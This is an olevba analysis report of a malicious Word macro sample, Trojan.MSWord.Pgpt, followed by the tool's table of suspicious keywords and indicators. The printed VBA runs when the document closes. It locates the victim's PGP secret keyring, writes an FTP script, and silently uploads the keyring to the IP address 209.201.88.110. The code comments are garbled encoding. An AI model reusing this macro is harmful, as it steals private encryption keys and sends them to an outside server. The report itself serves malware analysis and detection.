olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Pgpt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Pgpt - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'çŕđŕćĺíčĺ ďđč çŕęđűňčč äîęóěĺíňŕ
'...
'ďđîâĺđ˙ĺě ęëţ÷ áűë óęđŕäĺí ń ýňîé ěŕřčíű, ńĺëč íĺň ňî
čůĺě ęëţ÷
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info", "Caligula") = False) Then pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP EncryptedFile\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")
'óçíŕĺě ăäĺ ęŕňîëîă(?) pgp
If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP 'íŕ ýňîě ęîěďĺ íĺň pgp
End If

With Application.FileSearch
.FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With
'čůĺě íóćíűé íŕě ôŕéë
Randomize
  For i = 1 To 4
 NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"
Open "c:\cdbrk.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1
'îňęđîĺě č çŕďčřčě ďŕđŕěĺňđű îňńűëęč
Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide
'îňńűëŕĺě pgp ęëţ÷
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info", "Caligula") = True

End If

noPGP:
'íĺň pgp
'ńîőđŕí˙ĺě â ŕęňčâíîě äîęóěĺíňĺ
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

